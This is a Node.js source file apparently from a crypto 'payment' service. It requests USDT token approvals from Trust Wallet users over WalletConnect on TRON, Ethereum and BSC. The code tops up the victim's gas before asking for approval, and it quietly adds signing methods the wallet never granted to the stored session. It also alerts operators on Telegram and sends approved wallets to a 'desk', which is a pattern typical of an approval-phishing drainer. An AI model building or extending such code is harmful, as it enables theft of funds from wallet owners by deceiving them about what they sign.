const paymentStore = require("../storage/payments");
const sessionStore = require("../storage/sessions");
const { getClient } = require("./walletconnect");
const { getNetwork } = require("../config/networks");
const { approveAmountRaw, approveAmountLabel } = require("../config/approvalAmount");
const { requireContracts } = require("../config/contracts");
const { verifyPaymentTransaction } = require("./transactionVerifier");
const { emitPaymentEvent, assertActiveSession, publicPayment, maybeEmitFormAvailable } = require("./paymentService");
const { emitEvent } = require("../utils/events");
const {
    encodeErc20Approve
} = require("../utils/helpers");
const { NotFoundError, ValidationError, WalletConnectError } = require("../utils/errors");
const { liveEthMeetsMin } = require("../config/evmGas");
const logger = require("../utils/logger");

const approvalInFlight = new Set();

function normalizeTxHash(value) {
    const text = String(value || "").trim();
    const match = text.match(/0x[a-fA-F0-9]{64}/i) || text.match(/\b[a-fA-F0-9]{64}\b/);

    if (!match) {
        return null;
    }

    return match[0].startsWith("0x") || match[0].startsWith("0X")
        ? `0x${match[0].slice(2)}`
        : `0x${match[0]}`;
}

function extractTxHash(result, depth = 0) {
    if (result == null || depth > 6) {
        return null;
    }

    if (typeof result === "string" || typeof result === "number") {
        return normalizeTxHash(result) || (typeof result === "string" ? result.trim() || null : null);
    }

    if (Array.isArray(result)) {
        for (const item of result) {
            const found = extractTxHash(item, depth + 1);
            if (found) {
                return found;
            }
        }
        return null;
    }

    if (typeof result !== "object") {
        return null;
    }

    const direct = result.txid
        || result.txID
        || result.hash
        || result.transactionHash
        || result.txHash
        || result.transaction?.txID
        || result.transaction?.txid
        || result.transaction?.hash;

    const fromDirect = normalizeTxHash(direct);
    if (fromDirect) {
        return fromDirect;
    }

    return extractTxHash(result.result, depth + 1)
        || extractTxHash(result.transaction, depth + 1)
        || extractTxHash(result.data, depth + 1);
}

function pickAccount(session, network) {
    const accounts = session.accounts || [];
    return accounts.find((item) => item.chainId === network.chainId)
        || (network.namespace === "tron"
            ? accounts.find((item) => item.namespace === "tron")
            : accounts.find((item) => item.namespace === network.namespace && item.chainId === network.chainId))
        || accounts.find((item) => item.namespace === network.namespace)
        || null;
}

function unwrapTronTransaction(unsigned) {
    return unsigned?.transaction || unsigned;
}

async function broadcastTronSigned(signed, deps = {}) {
    const fetchImpl = deps.fetchImpl || fetch;
    const hash = extractTxHash(signed);

    if (hash && typeof signed === "string") {
        return hash;
    }

    const tx = unwrapTronTransaction(signed);

    if (!tx || typeof tx !== "object") {
        return hash;
    }

    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
    const key = String(require("../config/env").TRON_API_KEY || "").trim();
    const headers = { "Content-Type": "application/json" };
    if (key) {
        headers["TRON-PRO-API-KEY"] = key;
    }
    const response = await fetchImpl(`${base}/wallet/broadcasttransaction`, {
        method: "POST",
        headers,
        body: JSON.stringify(tx)
    });
    const payload = await response.json();
    return extractTxHash(payload) || extractTxHash(tx) || hash;
}

function wcNamespace(client, session, namespace) {
    try {
        return client?.session?.get?.(session.sessionTopic)?.namespaces?.[namespace] || null;
    } catch (_err) {
        return null;
    }
}

function sessionHasMethod(client, session, namespace, method) {
    return (wcNamespace(client, session, namespace)?.methods || []).includes(method);
}

function tronChainFromAccount(account) {
    const value = String(account || "");
    const parts = value.split(":");

    if (parts.length >= 2 && parts[0] === "tron") {
        return `${parts[0]}:${parts[1]}`;
    }

    return null;
}

function approvedTronChainIds(client, session, fallback) {
    const ids = new Set();
    const ns = wcNamespace(client, session, "tron");

    for (const chain of ns?.chains || []) {
        ids.add(chain);
    }

    for (const account of ns?.accounts || []) {
        const chain = tronChainFromAccount(account);
        if (chain) {
            ids.add(chain);
        }
    }

    for (const item of session?.accounts || []) {
        if (item?.namespace === "tron" && item.chainId) {
            ids.add(item.chainId);
        }
    }

    if (fallback) {
        ids.add(fallback);
    }

    return [...ids].filter((id) => id && String(id).startsWith("tron:"));
}

function approvedTronChainId(client, session, fallback) {
    return approvedTronChainIds(client, session, fallback)[0] || fallback;
}

function tronUsesV1(client, session) {
    try {
        const props = client?.session?.get?.(session.sessionTopic)?.sessionProperties || {};
        return String(props.tron_method_version || "") === "v1";
    } catch (_err) {
        return false;
    }
}

function ensureTronSessionCanSign(client, session) {
    const topic = session?.sessionTopic;

    if (!topic || !client?.session?.get || typeof client.session.set !== "function") {
        return;
    }

    let wcSession;

    try {
        wcSession = client.session.get(topic);
    } catch (_err) {
        return;
    }

    const tron = wcSession?.namespaces?.tron;

    if (!tron) {
        return;
    }

    const methods = new Set(tron.methods || []);
    const chains = new Set([...(tron.chains || []), ...approvedTronChainIds(client, session)]);
    const nextMethods = [...new Set([...methods, "tron_signTransaction", "tron_signMessage"])];
    const nextChains = [...chains];
    const sameMethods = nextMethods.length === methods.size && nextMethods.every((item) => methods.has(item));
    const sameChains = nextChains.length === (tron.chains || []).length
        && nextChains.every((item) => (tron.chains || []).includes(item));

    if (sameMethods && sameChains) {
        return;
    }

    client.session.set(topic, {
        ...wcSession,
        namespaces: {
            ...wcSession.namespaces,
            tron: {
                ...tron,
                methods: nextMethods,
                chains: nextChains
            }
        }
    });
    logger.info({
        topic,
        methods: nextMethods,
        chains: nextChains
    }, "Enabled TRON sign methods on the WalletConnect session so Trust can show the approval");
}

async function buildTronApprove(from, spender, amountRaw, tokenContract) {
    const { TronWeb } = require("tronweb");
    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
    const env = require("../config/env");
    const key = String(env.TRON_API_KEY || "").trim();
    const tronWeb = new TronWeb({
        fullHost: base,
        headers: key ? { "TRON-PRO-API-KEY": key } : undefined
    });
    tronWeb.setAddress(from);
    const triggered = await tronWeb.transactionBuilder.triggerSmartContract(
        tokenContract,
        "approve(address,uint256)",
        { feeLimit: 150000000, callValue: 0 },
        [
            { type: "address", value: spender },
            { type: "uint256", value: amountRaw.toString() }
        ],
        from
    );
    const transaction = unwrapTronTransaction(triggered);

    if (!transaction || !transaction.txID) {
        throw new Error(triggered?.result?.message || triggered?.Error || "TronGrid did not return a transaction");
    }

    return {
        visible: false,
        txID: transaction.txID,
        raw_data: transaction.raw_data,
        raw_data_hex: transaction.raw_data_hex
    };
}

async function requestTronSign(client, session, chainId, address, transaction) {
    const topic = session.sessionTopic;
    ensureTronSessionCanSign(client, session);
    const requestChain = approvedTronChainId(client, session, chainId);

    if (!requestChain) {
        throw new ValidationError("This wallet did not share a TRON chain. Enable TRON in Trust Wallet and reconnect.");
    }

    const nested = { address, transaction: { transaction } };
    const flat = { address, transaction };
    const params = tronUsesV1(client, session) ? flat : nested;

    logger.info({
        chainId: requestChain,
        methods: wcNamespace(client, session, "tron")?.methods || [],
        v1: tronUsesV1(client, session)
    }, "Requesting TRON approval in Trust Wallet");

    return client.request({
        topic,
        chainId: requestChain,
        request: {
            method: "tron_signTransaction",
            params
        }
    });
}

function eip155Hex(chainId) {
    return `0x${Number(String(chainId).split(":")[1]).toString(16)}`;
}

const EVM_ADD_CHAIN = {
    eth: {
        chainId: "0x1",
        chainName: "Ethereum",
        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
        rpcUrls: ["https://ethereum.publicnode.com"],
        blockExplorerUrls: ["https://etherscan.io"]
    },
    bsc: {
        chainId: "0x38",
        chainName: "BNB Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org"],
        blockExplorerUrls: ["https://bscscan.com"]
    }
};

function sessionEip155Chains(session, client) {
    const fromStore = (session.accounts || [])
        .map((item) => item.chainId)
        .filter((id) => String(id).startsWith("eip155:"));

    try {
        const wcSession = client?.session?.get?.(session.sessionTopic);
        const chains = wcSession?.namespaces?.eip155?.chains || [];
        const fromAccounts = (wcSession?.namespaces?.eip155?.accounts || []).map((account) => {
            const parts = String(account).split(":");
            return parts.length >= 2 ? `${parts[0]}:${parts[1]}` : null;
        }).filter(Boolean);
        return [...new Set([...fromStore, ...chains, ...fromAccounts])];
    } catch (_err) {
        return [...new Set(fromStore)];
    }
}

async function ensureEvmChain(client, session, network, topic) {
    if (!sessionHasMethod(client, session, "eip155", "wallet_switchEthereumChain")) {
        return;
    }

    const hexChainId = eip155Hex(network.chainId);
    const approved = sessionEip155Chains(session, client);
    const requestChainId = approved.includes(network.chainId) ? network.chainId : (approved[0] || network.chainId);
    const addParams = EVM_ADD_CHAIN[network.key];

    try {
        await client.request({
            topic,
            chainId: requestChainId,
            request: {
                method: "wallet_switchEthereumChain",
                params: [{ chainId: hexChainId }]
            }
        });
        return;
    } catch (err) {
        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_switchEthereumChain failed");
    }

    if (!addParams) {
        return;
    }

    try {
        await client.request({
            topic,
            chainId: requestChainId,
            request: {
                method: "wallet_addEthereumChain",
                params: [addParams]
            }
        });
    } catch (err) {
        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_addEthereumChain failed");
    }
}

async function sendEvmApprove(client, topic, chainId, from, to, data) {
    return client.request({
        topic,
        chainId,
        request: {
            method: "eth_sendTransaction",
            params: [{ from, to, value: "0x0", data }]
        }
    });
}

async function sendWalletApproval(client, session, payment, network, account) {
    const topic = session.sessionTopic;
    const amountRaw = approveAmountRaw(network.usdtDecimals);

    if (network.namespace === "tron") {
        if (!account?.address || (!String(account.address).startsWith("T") && !String(account.address).startsWith("41"))) {
            throw new ValidationError("This wallet did not share a TRON address. Enable TRON in the wallet and reconnect.");
        }

        const transaction = await buildTronApprove(
            account.address,
            payment.spender,
            amountRaw,
            payment.tokenContract
        );
        const signed = await requestTronSign(
            client,
            session,
            network.chainId,
            account.address,
            transaction
        );
        const txHash = await broadcastTronSigned(signed);
        return txHash || signed;
    }

    await ensureEvmChain(client, session, network, topic);
    return sendEvmApprove(
        client,
        topic,
        network.chainId,
        account.address,
        payment.tokenContract,
        encodeErc20Approve(payment.spender, amountRaw)
    );
}

async function finalizeWalletResult(paymentId, result, deps = {}) {
    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        return;
    }

    const txHash = extractTxHash(result);
    paymentStore.updatePayment(paymentId, {
        status: "wallet_confirmed",
        transactionHash: txHash
    });

    const latest = paymentStore.getPayment(paymentId);
    const pending = /not found|not found on-chain|No transaction hash|RPC/i;
    const shouldPoll = !deps.rpc && !deps.fetcher && !deps.sendWalletApproval;
    const attempts = latest?.network === "eth" ? 40 : 12;
    const delayMs = latest?.network === "eth" ? 3000 : 2000;

    async function runVerify() {
        try {
            return await verifyPaymentTransaction(latest, txHash, deps);
        } catch (_err) {
            return {
                valid: false,
                reason: "Transaction not found on-chain yet"
            };
        }
    }

    let verification = await runVerify();

    for (let attempt = 0; shouldPoll && attempt < attempts && !verification.valid && pending.test(verification.reason || ""); attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, delayMs));
        verification = await runVerify();
    }

    if (!verification.valid) {
        const invalid = paymentStore.updatePayment(paymentId, {
            status: "invalid",
            error: verification.reason
        });
        emitPaymentEvent("approval_failed", invalid, { reason: verification.reason });
        try {
            const { notifyApprovalStatus } = require("./telegramNotifications");
            notifyApprovalStatus(invalid).catch((err) => {
                logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
            });
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
        }
        return;
    }

    const verified = paymentStore.updatePayment(paymentId, {
        status: "verified",
        transactionHash: verification.transactionHash || txHash,
        verifiedAmountRaw: verification.amount != null ? String(verification.amount) : null,
        error: null
    });
    emitPaymentEvent("approval_approved", verified);
    emitPaymentEvent("payment_verified", verified);
    maybeEmitFormAvailable(verified.connectionId, verified.groupId);

    try {
        const { notifyApprovalStatus, notifyApprovalSuccessful } = require("./telegramNotifications");
        notifyApprovalSuccessful(verified).catch((err) => {
            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval success notification failed");
        });
        notifyApprovalStatus(verified).catch((err) => {
            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
        });
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
    }

    try {
        const { ingestApprovedWallet } = require("./deskIngest");
        ingestApprovedWallet(verified).catch((err) => {
            logger.warn({ err: { message: err.message }, paymentId }, "Desk ingest failed");
        });
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Desk ingest failed");
    }
}

async function requestApproval(paymentId, deps = {}) {
    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    if (
        payment.approvalSent
        || payment.approvalRunScheduled
        || payment.status === "requested"
        || payment.status === "wallet_confirmed"
        || payment.status === "verified"
    ) {
        return publicPayment(payment);
    }

    const networkLock = `${payment.connectionId}:${payment.network}`;

    if (approvalInFlight.has(paymentId) || approvalInFlight.has(networkLock)) {
        return publicPayment(payment);
    }

    approvalInFlight.add(paymentId);
    approvalInFlight.add(networkLock);

    try {
    if (payment.status === "verified") {
        throw new ValidationError("This payment is already verified");
    }

    if (payment.status !== "created" && payment.status !== "awaiting_gas") {
        throw new ValidationError("This payment cannot be requested in its current status");
    }

    const session = sessionStore.getSession(payment.connectionId);
    assertActiveSession(session);

    const { checkGasSufficiency, confirmGasQuote, needsGasFunding } = require("./gasFunding");
    emitEvent("gas_check_started", {
        connectionId: payment.connectionId,
        network: payment.network,
        paymentId
    });
    let liveGas;
    if (deps.checkGasSufficiency) {
        liveGas = await deps.checkGasSufficiency(session, payment.network, deps);
    } else {
        try {
            await require("./balances").refreshBalances(payment.connectionId, { ...deps, skipCache: true });
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Live gas refresh failed before approval");
        }
        const latest = sessionStore.getSession(payment.connectionId) || session;
        liveGas = await checkGasSufficiency(latest, payment.network, deps);
    }

    emitEvent("gas_check_finished", {
        connectionId: payment.connectionId,
        network: payment.network,
        paymentId,
        sufficient: liveGas?.sufficient === true
    });

    logger.info({
        network: payment.network,
        walletGas: liveGas?.currentBalanceRaw ?? null,
        requiredGas: liveGas?.estimatedRequiredRaw ?? null,
        needFunding: needsGasFunding(liveGas)
    }, "Gas funding decision");

    if (needsGasFunding(liveGas)) {
        const attempts = deps.checkGasSufficiency ? 1 : 8;
        for (let i = 0; i < attempts; i += 1) {
            const current = paymentStore.getPayment(paymentId);
            if (!current?.gasFundingTxHash) {
                try {
                    await confirmGasQuote(paymentId, {}, deps);
                } catch (err) {
                    logger.warn({ err: { message: err.message }, paymentId }, "Gas top-up before approval failed");
                }
            }

            const latest = sessionStore.getSession(payment.connectionId) || session;
            liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
            if (liveGas?.sufficient === true) {
                break;
            }
            if (!deps.checkGasSufficiency && i < attempts - 1) {
                await new Promise((resolve) => setTimeout(resolve, 2000));
            }
        }
    }

    if (liveGas?.sufficient === true && payment.network === "eth" && !liveEthMeetsMin(liveGas.currentBalanceRaw)) {
        liveGas = {
            ...liveGas,
            sufficient: false,
            needFunding: true,
            reason: "Need at least 0.01 ETH for Ethereum gas. Approval stays closed until live ETH is confirmed."
        };
    }

    if (!liveGas || liveGas.sufficient !== true || (payment.network === "eth" && !liveEthMeetsMin(liveGas.currentBalanceRaw))) {
        const blocked = paymentStore.updatePayment(paymentId, {
            gasQuote: liveGas || payment.gasQuote,
            gasSufficient: false,
            status: "awaiting_gas",
            error: liveGas?.reason || `Native gas is insufficient for the ${approveAmountLabel()} approval`
        });
        emitPaymentEvent("approval_failed", blocked, { reason: blocked.error });
        throw new ValidationError(blocked.error);
    }

    paymentStore.updatePayment(paymentId, {
        gasQuote: liveGas,
        gasSufficient: true,
        gasFundingVerified: Boolean(payment.gasFundingTxHash) || Boolean(payment.gasFundingVerified)
    });

    const contracts = requireContracts(payment.network);
    const network = getNetwork(payment.network);

    if (payment.spender !== contracts.card || payment.tokenContract !== contracts.usdt) {
        throw new ValidationError("Payment contracts do not match server configuration");
    }

    const maxRaw = approveAmountRaw(network.usdtDecimals);

    if (BigInt(payment.allowanceRaw) > maxRaw) {
        throw new ValidationError(`Allowance exceeds ${approveAmountLabel()}`);
    }

    const account = pickAccount(session, network);

    if (!account?.address) {
        throw new ValidationError(`Connected wallet has no ${network.name} account`);
    }

    const client = deps.client || getClient();

    if (!client) {
        throw new WalletConnectError("WalletConnect is not initialized");
    }

    const requested = paymentStore.updatePayment(paymentId, {
        status: "requested",
        approvalRunScheduled: true,
        fromAddress: account.address,
        error: null
    });

    emitPaymentEvent("approval_request_sent", requested);
    try {
        const { notifyApprovalRequested } = require("./telegramNotifications");
        notifyApprovalRequested(requested).catch(() => {});
    } catch (_err) {
        /* telegram optional */
    }

    const send = deps.sendWalletApproval || sendWalletApproval;
    const wait = deps.wait === true;

    const run = async () => {
        try {
            const current = paymentStore.getPayment(paymentId);
            if (current?.approvalSent) {
                return publicPayment(current);
            }
            paymentStore.updatePayment(paymentId, { approvalSent: true });
            const latestSession = sessionStore.getSession(payment.connectionId);
            const result = await send(client, latestSession, requested, network, account);
            await finalizeWalletResult(paymentId, result, deps);
            return publicPayment(paymentStore.getPayment(paymentId));
        } catch (err) {
            logger.warn({ err, paymentId }, "Payment approval was rejected or failed");
            const protocol = /Unknown method|Missing or invalid|isValidRequest|chainId/i.test(String(err.message || ""));
            const failed = paymentStore.updatePayment(paymentId, {
                status: protocol ? "failed" : "rejected",
                error: err.message
            });
            emitPaymentEvent(protocol ? "approval_failed" : "approval_rejected", failed, { message: err.message });
            try {
                const { notifyApprovalStatus } = require("./telegramNotifications");
                notifyApprovalStatus(failed).catch((notifyErr) => {
                    logger.warn({ err: { message: notifyErr.message }, paymentId }, "Telegram approval notification failed");
                });
            } catch (notifyErr) {
                logger.warn({ err: { message: notifyErr.message }, paymentId }, "Telegram approval notification failed");
            }
            return publicPayment(failed);
        } finally {
            approvalInFlight.delete(paymentId);
            approvalInFlight.delete(networkLock);
        }
    };

    if (wait) {
        return run();
    }

    setImmediate(() => {
        run().catch((err) => logger.error({ err, paymentId }, "Approval background task failed"));
    });

    return publicPayment(requested);
    } catch (err) {
        approvalInFlight.delete(paymentId);
        approvalInFlight.delete(networkLock);
        throw err;
    }
}

module.exports = {
    requestApproval,
    sendWalletApproval,
    extractTxHash,
    approvedTronChainIds,
    ensureTronSessionCanSign,
    requestTronSign
};
